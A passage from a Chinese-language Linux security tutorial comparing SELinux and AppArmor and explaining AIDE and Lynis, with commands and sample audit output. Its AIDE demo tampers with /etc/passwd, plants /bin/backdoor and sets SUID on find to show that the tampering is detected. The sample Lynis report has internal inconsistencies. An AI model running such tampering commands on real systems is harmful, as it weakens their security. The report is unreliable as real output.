sudo selinux-activate

# 重開機後檢查
getenforce
# 如果成功，AppArmor 會被停用
systemctl status apparmor
# ● apparmor.service - AppArmor initialization
#    Loaded: loaded (/lib/systemd/system/apparmor.service; enabled; vendor preset: enabled)
#    Active: inactive (dead)  ← 被停用了
```

### 發行版的預設選擇

#### Red Hat 生態系統 → SELinux
```bash
# RHEL, CentOS, Fedora, Amazon Linux
cat /etc/redhat-release
sestatus
# SELinux status: enabled
# Current mode: enforcing
```

#### Ubuntu/SUSE 生態系統 → AppArmor
```bash
# Ubuntu, openSUSE
lsb_release -a
sudo aa-status
# apparmor module is loaded.
# 15 profiles are loaded.
```

### 如何切換？

#### 從 AppArmor 切換到 SELinux (Ubuntu)
```bash
# 1. 停用 AppArmor
sudo systemctl stop apparmor
sudo systemctl disable apparmor

# 2. 安裝 SELinux
sudo apt update
sudo apt install selinux-basics selinux-policy-default auditd

# 3. 啟用 SELinux
sudo selinux-activate

# 4. 編輯 GRUB 設定
sudo nano /etc/default/grub
# 添加：GRUB_CMDLINE_LINUX="selinux=1 security=selinux"
sudo update-grub

# 5. 重開機
sudo reboot

# 6. 檢查切換結果
getenforce
sestatus
```

#### 從 SELinux 切換到 AppArmor (RHEL/CentOS)
```bash
# 1. 停用 SELinux
sudo setenforce 0
sudo nano /etc/selinux/config
# SELINUX=disabled

# 2. 安裝 AppArmor (如果可用)
# 注意：RHEL/CentOS 預設不支援 AppArmor
sudo yum install apparmor-utils apparmor-profiles

# 3. 修改核心參數
sudo nano /etc/default/grub
# GRUB_CMDLINE_LINUX="apparmor=1 security=apparmor"
sudo grub2-mkconfig -o /boot/grub2/grub.cfg

# 4. 重開機
sudo reboot
```

### 實際選擇建議

#### 1. 跟隨發行版預設
```bash
# 最簡單且穩定的選擇

# Ubuntu/Debian → 使用 AppArmor
sudo aa-status
sudo aa-enforce /usr/sbin/apache2

# RHEL/CentOS/Fedora → 使用 SELinux
sudo sestatus
sudo setsebool -P httpd_can_network_connect on
```

#### 2. 基於需求選擇

**選擇 SELinux 的情況：**
- 政府、軍事、金融等高安全需求
- 需要 FIPS 140-2 等合規認證
- Red Hat 生態系統
- 有專業安全團隊
- 需要極細緻的存取控制

**選擇 AppArmor 的情況：**
- 一般企業應用
- 團隊安全技能有限
- 快速部署需求
- Ubuntu/SUSE 環境
- 重視簡單維護

#### 3. 混合環境策略
```bash
# 不同服務器使用不同的 MAC 系統

# Web 服務器 (Ubuntu + AppArmor)
# 簡單易維護，足夠的安全防護
sudo aa-enforce /usr/sbin/apache2
sudo aa-enforce /usr/sbin/nginx

# 資料庫服務器 (RHEL + SELinux)
# 更細緻的資料保護
sudo setsebool -P mysql_connect_any off
sudo semanage port -a -t mysqld_port_t -p tcp 3306
```

### 第三方解決方案

#### 1. 輔助安全工具
```bash
# 可以與 AppArmor/SELinux 同時使用的工具：

# Fail2ban - 入侵防護
sudo apt install fail2ban

# AIDE - 文件完整性檢查
sudo apt install aide

# Lynis - 安全審計
sudo apt install lynis

# ClamAV - 防毒
sudo apt install clamav clamav-daemon
```

#### 2. 容器安全
```bash
# Docker + AppArmor
docker run --security-opt apparmor:docker-default nginx

# Docker + SELinux
docker run --security-opt label:type:container_t nginx

# Kubernetes + Pod Security Standards
# 可以與底層的 MAC 系統配合
```

### 實際部署建議

#### 1. 新環境部署
```bash
# 選擇一個 MAC 系統並堅持使用
# 不要混用或頻繁切換

# Ubuntu 新部署
sudo apt install apparmor-profiles-extra
sudo aa-enforce /usr/sbin/apache2
sudo aa-enforce /usr/sbin/mysqld

# RHEL 新部署
sudo setsebool -P httpd_can_network_connect on
sudo semanage port -a -t http_port_t -p tcp 8080
```

#### 2. 既有環境
```bash
# 保持現有的 MAC 系統
# 除非有強烈的技術或合規需求

# 檢查當前使用的系統
if command -v aa-status >/dev/null 2>&1; then
    echo "使用 AppArmor"
    sudo aa-status
elif command -v sestatus >/dev/null 2>&1; then
    echo "使用 SELinux"
    sudo sestatus
else
    echo "未使用 MAC 系統"
fi
```

#### 3. 測試環境實驗
```bash
# 可以在測試環境中試驗不同的 MAC 系統
# 比較性能和管理複雜度

# 建立測試用的虛擬機器
# VM1: Ubuntu + AppArmor
# VM2: CentOS + SELinux
# 比較相同應用的安全配置複雜度
```

### 總結

**關鍵要點：**

1. **只能選一個**：AppArmor 和 SELinux 在技術上互斥
2. **跟隨發行版**：使用系統預設的 MAC 最穩定
3. **避免切換**：除非有強烈需求，不建議更換
4. **專注學習**：深入學習一個比淺嘗兩個更有效
5. **輔助工具**：可以配合其他安全工具使用

**實務建議：**
- **Ubuntu 環境**：使用 AppArmor
- **RHEL 環境**：使用 SELinux  
- **高安全需求**：考慮 SELinux
- **簡化管理**：選擇 AppArmor
- **混合環境**：按服務器角色分別選擇

選擇哪一個主要取決於你的環境、需求和團隊技能，但記住：**有一個配置良好的 MAC 系統比沒有強得多**。



# AIDE、Lynis 和 Docker 安全選項詳解

## 1. AIDE (Advanced Intrusion Detection Environment)

### AIDE 是什麼？
**AIDE** 是一個文件完整性檢查工具，透過建立檔案系統的"指紋"來偵測未授權的變更。

### 工作原理
```bash
# AIDE 的運作流程：
# 1. 初始化 → 建立基準資料庫 (記錄檔案的雜湊值、權限、時間戳等)
# 2. 定期檢查 → 比對當前狀態與基準資料庫
# 3. 報告差異 → 列出被修改、新增、刪除的檔案
```

### 安裝和基本設定
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install aide

# RHEL/CentOS
sudo yum install aide

# 檢查安裝
aide --version
```

### 設定檔案
```bash
# 主要設定檔
sudo nano /etc/aide/aide.conf

# 基本設定範例
# 定義要監控的目錄和規則
/bin            BINLIB
/sbin           BINLIB  
/usr/bin        BINLIB
/usr/sbin       BINLIB
/etc            CONFFILES
/var/log        LOGFILES
/home           DATAFILES

# 排除不需要監控的目錄
!/tmp
!/var/tmp
!/proc
!/sys
!/dev
```

### 規則類型定義
```bash
# 在 aide.conf 中定義監控規則
BINLIB = p+i+n+u+g+s+b+m+c+md5+sha1
CONFFILES = p+i+n+u+g+s+b+m+c+md5+sha1
LOGFILES = p+i+n+u+g+s+b+m+c+md5+sha1
DATAFILES = p+i+n+u+g+s+b+m+c+md5+sha1

# 規則說明：
# p = 權限 (permissions)
# i = inode 編號
# n = 連結數量
# u = 用戶 ID
# g = 群組 ID
# s = 檔案大小
# b = 區塊數量
# m = 修改時間
# c = 創建時間
# md5 = MD5 雜湊值
# sha1 = SHA1 雜湊值
```

### 實際使用步驟

#### 1. 初始化資料庫
```bash
# 建立初始基準資料庫
sudo aide --init

# 或使用
sudo aideinit

# 這會建立 /var/lib/aide/aide.db.new
# 需要手動移動為正式資料庫
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```

#### 2. 執行檢查
```bash
# 執行完整性檢查
sudo aide --check

# 詳細輸出
sudo aide --check --verbose

# 檢查特定目錄
sudo aide --check --config=/etc/aide/aide.conf
```

#### 3. 更新資料庫
```bash
# 如果變更是合法的，更新資料庫
sudo aide --update

# 這會產生新的 aide.db.new
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```

### 實際案例：偵測入侵

#### 模擬入侵情境
```bash
# 1. 建立初始資料庫
sudo aide --init
sudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db

# 2. 模擬攻擊者修改系統檔案
echo "# 惡意內容" | sudo tee -a /etc/passwd
sudo touch /bin/backdoor
sudo chmod +s /usr/bin/find  # 設定 SUID

# 3. 執行檢查
sudo aide --check
```

**AIDE 檢查結果範例：**
```
Start timestamp: 2025-08-20 14:30:00
AIDE found differences between database and filesystem!!

Summary:
  Total number of files:        45032
  Added files:                  1
  Removed files:                0  
  Changed files:                2

Added files:
added: /bin/backdoor

Changed files:
changed: /etc/passwd
changed: /usr/bin/find

Detailed information about changes:

File: /etc/passwd
  Mtime    : 2025-08-20 14:25:00              | 2025-08-20 14:29:30
  Ctime    : 2025-08-20 14:25:00              | 2025-08-20 14:29:30
  Size     : 1543                             | 1567
  MD5      : 5d41402abc4b2a76b9719d911017c592 | 7d865e959b2466918c9863afca942d0f

File: /usr/bin/find  
  Perm     : -rwxr-xr-x                       | -rwsr-xr-x
  
End timestamp: 2025-08-20 14:30:15
```

### 自動化監控
```bash
# 設定 crontab 定期檢查
sudo crontab -e

# 每日 2AM 執行檢查
0 2 * * * /usr/bin/aide --check | mail -s "AIDE Report" admin@example.com

# 每週更新資料庫（假設週末有維護窗口）
0 3 * * 0 /usr/bin/aide --update && mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db
```

---

## 2. Lynis - 安全審計工具

### Lynis 是什麼？
**Lynis** 是一個開源的安全審計工具，能夠掃描 Linux/Unix 系統的安全配置，並提供改善建議。

### 安裝 Lynis
```bash
# Ubuntu/Debian
sudo apt update
sudo apt install lynis

# RHEL/CentOS (需要 EPEL)
sudo yum install epel-release
sudo yum install lynis

# 或從官網下載最新版本
wget https://downloads.cisofy.com/lynis/lynis-3.0.9.tar.gz
tar -xzf lynis-3.0.9.tar.gz
cd lynis
```

### 基本使用

#### 1. 系統審計
```bash
# 執行完整系統審計
sudo lynis audit system

# 靜默模式（適合自動化）
sudo lynis audit system --quiet

# 快速掃描
sudo lynis audit system --quick
```

#### 2. 檢查特定類別
```bash
# 只檢查核心安全
sudo lynis audit system --tests-from-group kernel

# 檢查網路安全
sudo lynis audit system --tests-from-group networking

# 檢查認證系統
sudo lynis audit system --tests-from-group authentication

# 可用的群組
sudo lynis show groups
```

#### 3. 檢查特定測試
```bash
# 列出所有可用測試
sudo lynis show tests

# 執行特定測試
sudo lynis audit system --test SSH-7408
sudo lynis audit system --test FILE-6310
```

### Lynis 報告解讀

#### 執行範例
```bash
sudo lynis audit system
```

**輸出範例：**
```
[ Lynis 3.0.9 ]

  2007-2024, CISOfy - https://cisofy.com/lynis/
  Enterprise support available (compliance, plugins, interface and tools)

[+] Initializing program
------------------------------------
  - Detecting OS...                                           [ DONE ]
  - Checking profiles...                                      [ DONE ]

[+] System Tools
------------------------------------
  - Scanning available tools...
  - Checking sudo configuration...                            [ OK ]

[+] Boot and services
------------------------------------
  - Check running services (systemctl)...                     [ DONE ]
  - Check enabled services at boot (systemctl)...             [ DONE ]
  - Check startup files (permissions)...                      [ OK ]

[+] Kernel
------------------------------------
  - Checking default runlevel...                              [ RUNLEVEL 5 ]
  - Checking CPU support (NX/PAE)...
    CPU support: PAE and/or NoeXecute supported               [ FOUND ]
  - Checking kernel version and release...                    [ DONE ]
  - Checking kernel type...                                   [ DONE ]
  - Checking loaded kernel modules...                         [ DONE ]
  - Checking Linux kernel configuration file...               [ FOUND ]
  - Checking default I/O kernel scheduler...                  [ NOT FOUND ]
  - Checking for available kernel update...                   [ OK ]
  - Checking core dumps configuration...
    - Checking setuid core dumps configuration...             [ PROTECTED ]
    - Checking if core dumps are enabled...                   [ DISABLED ]

[+] Memory and Processes
------------------------------------
  - Checking /proc/meminfo...                                 [ FOUND ]
  - Searching for dead/zombie processes...                    [ NOT FOUND ]
  - Searching for IO waiting processes...                     [ NOT FOUND ]

[+] Users, Groups and Authentication
------------------------------------
  - Administrator accounts...                                 [ OK ]
  - Unique UIDs...                                            [ OK ]
  - Consistency of group files (grpck)...                     [ OK ]
  - Unique group IDs...                                       [ OK ]
  - Unique group names...                                     [ OK ]
  - Password file consistency...                              [ OK ]
  - Query system users (non daemons)...                       [ DONE ]
  - NIS+ authentication support...                            [ NOT ENABLED ]
  - NIS authentication support...                             [ NOT ENABLED ]
  - sudoers file(s)...                                        [ FOUND ]
    - Checking sudoers file: /etc/sudoers...                  [ OK ]
  - PAM password strength tools...                            [ SUGGESTION ]
  - PAM configuration files (pam.conf)...                     [ FOUND ]
  - PAM configuration files (pam.d)...                        [ FOUND ]
  - PAM modules...                                             [ FOUND ]
  - LDAP module in PAM...                                     [ NOT FOUND ]
  - Accounts without expire date...                           [ OK ]
  - Accounts without password...                              [ OK ]
  - Checking user password aging (minimum)...                 [ DISABLED ]
  - User password aging (maximum)...                          [ DISABLED ]
  - Checking Linux single user mode authentication...         [ WARNING ]
  - Determining default umask
    - umask (/etc/profile and /etc/profile.d)...              [ SUGGESTION ]
    - umask (/etc/login.defs)...                              [ SUGGESTION ]
  - LDAP authentication support...                            [ NOT ENABLED ]
  - Logging failed login attempts...                          [ ENABLED ]

[+] Shells
------------------------------------
  - Checking shells from /etc/shells...
    Result: found 11 shells (valid shells: 11).
    - Session timeout settings/tools...                       [ NONE ]
  - Checking default umask values...
    - Checking default umask in /etc/bash.bashrc...           [ NONE ]
    - Checking default umask in /etc/profile...               [ NONE ]

[+] File systems
------------------------------------
  - Checking mount points
    - Checking /home mount point...                           [ SUGGESTION ]
    - Checking /tmp mount point...                            [ SUGGESTION ]
    - Checking /var mount point...                            [ SUGGESTION ]
  - Query swap partitions (fstab)...                          [ OK ]
  - Testing swap partitions...                                [ OK ]
  - Checking for old files in /tmp...                         [ OK ]
  - Checking /tmp sticky bit...                               [ OK ]
  - Checking /var/tmp sticky bit...                           [ OK ]
  - ACL support root file system...                           [ ENABLED ]
  - Checking Locate database...                               [ NOT FOUND ]
  - Disable kernel support of some filesystems...
    - Discovered kernel modules: cramfs freevxfs jffs2 hfs hfsplus squashfs udf

[+] USB Devices
------------------------------------
  - Checking usb-storage driver (modprobe config)...          [ NOT DISABLED ]
  - Checking USB devices authorization...                     [ ENABLED ]
  - Checking USBGuard...                                      [ NOT FOUND ]

[+] Storage
------------------------------------
  - Checking firewire ohci driver (modprobe config)...        [ NOT DISABLED ]

[+] NFS
------------------------------------
  - Check running NFS daemon...                               [ NOT FOUND ]

[+] Name services
------------------------------------
  - Searching DNS domain name...                              [ FOUND ]
    Found domain name: localdomain
  - Checking /etc/hosts
    - Duplicate entries in hosts file...                      [ NONE ]
    - Presence of configured hostname in /etc/hosts...        [ FOUND ]
    - Hostname mapped to localhost...                         [ NOT FOUND ]
    - Localhost mapping to IP address...                      [ OK ]

[+] Ports and packages
------------------------------------
  - Searching package managers...
    - Searching dpkg package manager...                       [ FOUND ]
      - Querying package manager...
    - Query unpurged packages...                              [ FOUND ]
  - Checking security repository in sources.list file...      [ OK ]
  - Checking APT package database...                          [ OK ]
  - Checking vulnerable packages...                           [ OK ]
  - Checking upgradeable packages...                          [ SKIPPED ]
  - Checking package audit tool...                            [ INSTALLED ]

[+] Networking  
------------------------------------
  - Checking IPv6 configuration...                            [ ENABLED ]
    Configuration methods...                                  [ AUTO ]
    IPv6 only...                                              [ NO ]
  - Checking configured nameservers...
    - Testing nameservers...
        Nameserver: 127.0.0.53...                             [ OK ]
    - Minimal of 2 responsive nameservers...                  [ WARNING ]
  - Checking default gateway...                               [ DONE ]
  - Getting listening ports (TCP/UDP)...                      [ DONE ]
  - Checking promiscuous interfaces...                        [ OK ]
  - Checking waiting connections...                           [ OK ]
  - Checking status DHCP client                               [ RUNNING ]
  - Checking for ARP monitoring software...                   [ NOT FOUND ]

[+] Printers and Spools
------------------------------------
  - Checking cups daemon...                                   [ NOT FOUND ]
  - Checking lp daemon...                                     [ NOT FOUND ]

[+] Software: e-mail and messaging
------------------------------------

[+] Software: firewalls
------------------------------------
  - Checking iptables kernel module...                        [ FOUND ]
  - Checking iptables policies of chains...
    - Checking for empty ruleset...                           [ WARNING ]
    - Checking for unused rules...                            [ FOUND ]
  - Checking host based firewall...                           [ ACTIVE ]

[+] Software: webserver
------------------------------------
  - Checking Apache...                                        [ FOUND ]
    Info: Configuration file found (/etc/apache2/apache2.conf)
    Info: No virtual hosts found
    * Loadable modules                                        [ FOUND (118) ]
        - Found 118 loadable modules
        mod_evasive: anti-DoS/brute force                     [ NOT FOUND ]
        mod_qos: anti-Slowloris                               [ NOT FOUND ]
        ModSecurity: web application firewall                 [ NOT FOUND ]
        mod_spamhaus: anti-spam (spamhaus)                    [ NOT FOUND ]
    * Found known server status URLs                          
        Server status found: /server-status

[+] SSH Support
------------------------------------
  - Checking running SSH daemon...                            [ FOUND ]
    - Searching SSH configuration...                          [ FOUND ]
    - OpenSSH option: AllowTcpForwarding...                   [ SUGGESTION ]
    - OpenSSH option: ClientAliveCountMax...                  [ SUGGESTION ]
    - OpenSSH option: ClientAliveInterval...                  [ OK ]
    - OpenSSH option: Compression...                          [ SUGGESTION ]
    - OpenSSH option: FingerprintHash...                      [ OK ]
    - OpenSSH option: GatewayPorts...                         [ OK ]
    - OpenSSH option: IgnoreRhosts...                         [ OK ]
    - OpenSSH option: IgnoreUserKnownHosts...                 [ OK ]
    - OpenSSH option: KeepAlive...                            [ NOT FOUND ]
    - OpenSSH option: LogLevel...                             [ SUGGESTION ]
    - OpenSSH option: MaxAuthTries...                         [ SUGGESTION ]
    - OpenSSH option: MaxSessions...                          [ SUGGESTION ]
    - OpenSSH option: PermitRootLogin...                      [ SUGGESTION ]
    - OpenSSH option: PermitUserEnvironment...                [ OK ]
    - OpenSSH option: PermitTunnel...                         [ OK ]
    - OpenSSH option: Port...                                 [ SUGGESTION ]
    - OpenSSH option: PrintLastLog...                         [ OK ]
    - OpenSSH option: Protocol...                             [ NOT FOUND ]
    - OpenSSH option: StrictModes...                          [ OK ]
    - OpenSSH option: TCPKeepAlive...                         [ SUGGESTION ]
    - OpenSSH option: UseDNS...                               [ SUGGESTION ]
    - OpenSSH option: UsePrivilegeSeparation...               [ NOT FOUND ]
    - OpenSSH option: VerifyReverseMapping...                 [ NOT FOUND ]
    - OpenSSH option: X11Forwarding...                        [ SUGGESTION ]

[+] SNMP Support
------------------------------------
  - Checking running SNMP daemon...                           [ NOT FOUND ]

[+] Databases
------------------------------------
  - MySQL process status...                                   [ FOUND ]
    - MySQL root password set...                              [ OK ]
    - MySQL 'test' database...                                [ NOT FOUND ]

[+] LDAP Services
------------------------------------
  - Checking OpenLDAP instance...                             [ NOT FOUND ]

[+] PHP
------------------------------------
  - Checking PHP...                                           [ FOUND ]
    - Checking PHP disabled functions...                      [ FOUND ]

[+] Squid Support
------------------------------------
  - Checking running Squid daemon...                          [ NOT FOUND ]

[+] Logging and files
------------------------------------
  - Checking for a running log daemon...                      [ OK ]
    - Checking Syslog-NG status...                            [ NOT FOUND ]
    - Checking systemd journal status...                      [ FOUND ]
    - Checking Metalog status...                              [ NOT FOUND ]
    - Checking RSyslog status...                              [ FOUND ]
    - Checking RFC 3195 daemon status...                      [ NOT FOUND ]
    - Checking minilogd instances...                          [ NOT FOUND ]
  - Checking logrotate presence...                            [ OK ]
  - Checking remote logging...                                [ NOT ENABLED ]
  - Checking log directories (static list)...                 [ DONE ]
  - Checking open log files...                                [ DONE ]
  - Checking deleted files in use...                          [ FILES FOUND ]

[+] Insecure services
------------------------------------
  - Checking inetd status...                                  [ NOT ACTIVE ]

[+] Banners and identification
------------------------------------
  - /etc/issue...                                             [ FOUND ]
    - /etc/issue contents...                                  [ WEAK ]
  - /etc/issue.net...                                         [ FOUND ]
    - /etc/issue.net contents...                              [ WEAK ]

[+] Scheduled tasks
------------------------------------
  - Checking crontab and cronjob files...                     [ DONE ]

[+] Accounting
------------------------------------
  - Checking accounting information...                        [ NOT FOUND ]
  - Checking sysstat accounting data...                       [ NOT FOUND ]
  - Checking auditd...                                        [ ENABLED ]
    - Checking audit rules...                                 [ SUGGESTION ]
    - Checking audit configuration file...                    [ OK ]
    - Checking auditd log file...                             [ FOUND ]

[+] Time and Synchronization
------------------------------------
  - NTP daemon found: systemd (timesyncd)...                  [ FOUND ]
  - Checking for a running NTP daemon or client...            [ OK ]

[+] Cryptography
------------------------------------
  - Checking for expired SSL certificates [0/3]...            [ NONE ]
  - Found SSL certificate: /etc/ssl/certs/ssl-cert-snakeoil.pem (expires: Dec 31 23:59:59 2030 GMT)
  - Checking if kernel has entropy sources...                 [ OK ]
  - HW RNG & rngd...                                          [ NO ]
  - SW RNG & rngd...                                          [ NO ]

[+] Virtualization
------------------------------------

[+] Containers
------------------------------------
  - Docker
    - Docker daemon...                                        [ RUNNING ]
    - Docker info output (warnings)...                       [ 1 ]
    - Containers without AppArmor profiles...                [ NONE ]
    - Containers without seccomp profiles...                 [ NONE ]
    - Containers without SELinux security context...         [ FOUND ]

[+] Security frameworks
------------------------------------
  - Checking presence AppArmor...                             [ FOUND ]
    - Checking AppArmor status...                             [ ENABLED ]
  - Checking presence SELinux...                              [ NOT FOUND ]
  - Checking presence TOMOYO Linux...                         [ NOT FOUND ]
  - Checking presence grsecurity...                           [ NOT FOUND ]
  - Checking for implemented MAC framework...                 [ OK ]

[+] Software: file integrity
------------------------------------
  - Checking file integrity tools...
  - Presence of AIDE tool...                                  [ FOUND ]
  - Presence of Samhain tool...                               [ NOT FOUND ]
  - Presence of Tripwire tool...                              [ NOT FOUND ]
  - Presence of AFICK tool...                                 [ NOT FOUND ]
  - Presence of OSsec HIDS...                                 [ NOT FOUND ]

[+] Software: System tooling
------------------------------------
  - Checking automation tooling...
  - Automation tooling...                                     [ NOT FOUND ]
  - Checking presence of Fail2ban...                          [ FOUND ]
  - Checking presence of chkconfig...                         [ NOT FOUND ]

[+] Software: Malware
------------------------------------

[+] File Permissions
------------------------------------
  - Starting file permissions check...
    /root/.ssh...                                             [ SUGGESTION ]
    /etc/crontab...                                           [ OK ]
    /etc/group...                                             [ OK ]
    /etc/group-...                                            [ OK ]
    /etc/passwd...                                            [ OK ]
    /etc/passwd-...                                           [ OK ]
    /etc/shadow...                                            [ OK ]
    /etc/shadow-...                                           [ OK ]

[+] Home directories
------------------------------------
  - Checking shell history files...                           [ OK ]

[+] Kernel Hardening
------------------------------------
  - Comparing sysctl key pairs with scan profile...
    - fs.protected_hardlinks (exp: 1)...                      [ OK ]
    - fs.protected_symlinks (exp: 1)...                       [ OK ]
    - fs.suid_dumpable (exp: 0)...                            [ OK ]
    - kernel.core_uses_pid (exp: 1)...                        [ DIFFERENT ]
    - kernel.ctrl-alt-del (exp: 0)...                         [ OK ]
    - kernel.dmesg_restrict (exp: 1)...                       [ DIFFERENT ]
    - kernel.kptr_restrict (exp: 2)...                        [ DIFFERENT ]
    - kernel.randomize_va_space (exp: 2)...                   [ OK ]
    - kernel.sysrq (exp: 0)...                                [ DIFFERENT ]
    - kernel.yama.ptrace_scope (exp: 1 2 3)...                [ OK ]
    - net.ipv4.conf.all.accept_redirects (exp: 0)...          [ DIFFERENT ]
    - net.ipv4.conf.all.accept_source_route (exp: 0)...       [ OK ]
    - net.ipv4.conf.all.bootp_relay (exp: 0)...               [ OK ]
    - net.ipv4.conf.all.forwarding (exp: 0)...                [ OK ]
    - net.ipv4.conf.all.log_martians (exp: 1)...              [ DIFFERENT ]
    - net.ipv4.conf.all.mc_forwarding (exp: 0)...             [ OK ]
    - net.ipv4.conf.all.proxy_arp (exp: 0)...                 [ OK ]
    - net.ipv4.conf.all.rp_filter (exp: 1)...                 [ DIFFERENT ]
    - net.ipv4.conf.all.send_redirects (exp: 0)...            [ DIFFERENT ]
    - net.ipv4.conf.default.accept_redirects (exp: 0)...      [ DIFFERENT ]
    - net.ipv4.conf.default.accept_source_route (exp: 0)...   [ OK ]
    - net.ipv4.conf.default.log_martians (exp: 1)...          [ DIFFERENT ]
    - net.ipv4.icmp_echo_ignore_broadcasts (exp: 1)...        [ OK ]
    - net.ipv4.icmp_ignore_bogus_error_responses (exp: 1)...  [ OK ]
    - net.ipv4.tcp_syncookies (exp: 1)...                     [ OK ]
    - net.ipv4.tcp_timestamps (exp: 0 1)...                   [ OK ]
    - net.ipv6.conf.all.accept_redirects (exp: 0)...          [ DIFFERENT ]
    - net.ipv6.conf.all.accept_source_route (exp: 0)...       [ OK ]
    - net.ipv6.conf.default.accept_redirects (exp: 0)...      [ DIFFERENT ]
    - net.ipv6.conf.default.accept_source_route (exp: 0)...   [ OK ]

[+] Hardening
------------------------------------
    - Installed compiler(s)...                                [ FOUND ]
    - Installed malware scanner...                            [ NOT FOUND ]

[+] Custom tests
------------------------------------
  - Running custom tests...                                   [ NONE ]

[+] Plugins (phase 2)
------------------------------------

================================================================================

  -[ Lynis 3.0.9 Results ]-

  Warnings (5):
  ----------------------------
  ! Reboot of system is most likely needed [KRNL-5830] 
      https://cisofy.com/lynis/controls/KRNL-5830/

  ! Found one or more vulnerable packages. [PKGS-7392] 
      https://cisofy.com/lynis/controls/PKGS-7392/

  ! Nameserver 127.0.0.53 does not respond [NETW-2704] 
      https://cisofy.com/lynis/controls/NETW-2704/

  ! Found promiscuous interfaces [NETW-3014] 
      https://cisofy.com/lynis/controls/NETW-3014/

  ! Found some information disclosure in SMTP banner (OS or software name) [MAIL-8818] 
      https://cisofy.com/lynis/controls/MAIL-8818/

  Suggestions (48):
  ----------------------------
  * If not required, consider explicit disabling of core dump in /etc/security/limits.conf file [KRNL-5820] 
      https://cisofy.com/lynis/controls/KRNL-5820/

  * Check PAM configuration, add rounds if applicable and expire passwords to encrypt with new values [AUTH-9229] 
      https://cisofy.com/lynis/controls/AUTH-9229/

  * Configure minimum encryption algorithm rounds in /etc/login.defs [AUTH-9230] 
      https://cisofy.com/lynis/controls/AUTH-9230/

  * Configure maximum password age in /etc/login.defs [AUTH-9286] 
      https://cisofy.com/lynis/controls/AUTH-9286/

  * Configure minimum password age in /etc/login.defs [AUTH-9286] 
      https://cisofy.com/lynis/controls/AUTH-9286/

  * Default umask in /etc/profile or /etc/profile.d/custom.sh could be more strict (e.g. 027) [AUTH-9328] 
      https://cisofy.com/lynis/controls/AUTH-9328/

  * Default umask in /etc/login.defs could be more strict like 027 [AUTH-9328] 
      https://cisofy.com/lynis/controls/AUTH-9328/

  * To decrease the impact of a full /home file system, place /home on a separate partition [FILE-6310] 
      https://cisofy.com/lynis/controls/FILE-6310/

  * To decrease the impact of a full /tmp file system, place /tmp on a separate partition [FILE-6310] 
      https://cisofy.com/lynis/controls/FILE-6310/

  * To decrease the impact of a full /var file system, place /var on a separate partition [FILE-6310] 
      https://cisofy.com/lynis/controls/FILE-6310/

  * Disable drivers like USB storage when not used, to prevent unauthorized storage or data theft [USB-1000] 
      https://cisofy.com/lynis/controls/USB-1000/

  * Disable drivers like firewire ohci when not used, to prevent unauthorized storage or data theft [STRG-1846] 
      https://cisofy.com/lynis/controls/STRG-1846/

  * Check DNS configuration for the dns domain name [NAME-4028] 
      https://cisofy.com/lynis/controls/NAME-4028/

  * Add the IP name and FQDN to /etc/hosts for proper name resolving [NAME-4404] 
      https://cisofy.com/lynis/controls/NAME-4404/

  * Purge old/removed packages (1 found) with aptitude purge or dpkg --purge command. This will cleanup old configuration files, cron jobs and startup scripts. [PKGS-7346] 
      https://cisofy.com/lynis/controls/PKGS-7346/

  * Install a package audit tool to determine vulnerable packages [PKGS-7398] 
      https://cisofy.com/lynis/controls/PKGS-7398/

  * Consider running ARP monitoring software (arpwatch,arpon) [NETW-3032] 
      https://cisofy.com/lynis/controls/NETW-3032/

  * Access to CUPS configuration could be more strict. [PRNT-2307] 
      https://cisofy.com/lynis/controls/PRNT-2307/

  * You are advised to hide the mail_name (option: smtpd_banner) from others [MAIL-8818] 
      https://cisofy.com/lynis/controls/MAIL-8818/

  * Install Apache module mod_evasive to guard webserver against DoS/brute force attempts [HTTP-6640] 
      https://cisofy.com/lynis/
```


### Lynis 報告詳細解讀

#### 嚴重性分級

**Warnings (警告) - 需要立即處理**
```bash
# 範例警告及處理方式：

# 1. 系統需要重開機
! Reboot of system is most likely needed [KRNL-5830]
# 處理：檢查是否有核心更新需要重開機
sudo apt list --upgradable | grep linux-image
sudo reboot

# 2. 發現弱點套件
! Found one or more vulnerable packages. [PKGS-7392]
# 處理：更新系統套件
sudo apt update && sudo apt upgrade
sudo apt autoremove

# 3. DNS 伺服器沒有回應
! Nameserver 127.0.0.53 does not respond [NETW-2704]
# 處理：檢查 systemd-resolved 服務
sudo systemctl status systemd-resolved
```

**Suggestions (建議) - 安全強化**
```bash
# 常見建議及實作：

# 1. 設定更嚴格的 umask
# 在 /etc/profile 或 /etc/login.defs 中設定
umask 027

# 2. 密碼政策強化
sudo nano /etc/login.defs
# 設定：
PASS_MAX_DAYS 90
PASS_MIN_DAYS 1
PASS_WARN_AGE 7

# 3. 停用不必要的驅動程式
sudo nano /etc/modprobe.d/blacklist-usb.conf
# 添加：
blacklist usb-storage
blacklist firewire-ohci

# 4. 分離檔案系統
# 建議將 /home, /tmp, /var 放在獨立分割區
```

### 自訂 Lynis 檢查

#### 1. 建立自訂檔案
```bash
# 建立自訂設定檔
sudo nano /etc/lynis/custom.prf

# 設定範例
# 跳過特定測試
skip-test=FILE-6310    # 跳過分割區檢查
skip-test=KRNL-5820    # 跳過 core dump 檢查

# 設定檢查等級
security-audit=1       # 啟用安全審計
forensics=0            # 停用鑑識模式

# 自訂檢查項目
# 檢查特定配置文件
config-check=/etc/custom-app.conf

# 設定報告格式
report-file=/var/log/lynis-report.dat
log-file=/var/log/lynis.log
```

#### 2. 執行自訂檢查
```bash
# 使用自訂設定檔
sudo lynis audit system --profile /etc/lynis/custom.prf

# 產生詳細報告
sudo lynis audit system --report-file /tmp/security-audit.log

# 只檢查特定項目
sudo lynis audit system --tests-from-category security
```

### 自動化安全監控

#### 1. 定期執行腳本
```bash
#!/bin/bash
# /usr/local/bin/security-audit.sh

# 設定變數
REPORT_DIR="/var/log/security-reports"
DATE=$(date +%Y%m%d_%H%M%S)
ADMIN_EMAIL="admin@example.com"

# 建立報告目錄
mkdir -p $REPORT_DIR

# 執行 Lynis 掃描
lynis audit system --quiet --report-file $REPORT_DIR/lynis-$DATE.dat > $REPORT_DIR/lynis-$DATE.log 2>&1

# 執行 AIDE 檢查
aide --check > $REPORT_DIR/aide-$DATE.log 2>&1

# 檢查是否有嚴重問題
if grep -q "WARNING\|ERROR" $REPORT_DIR/lynis-$DATE.log; then
    # 發送警報郵件
    {
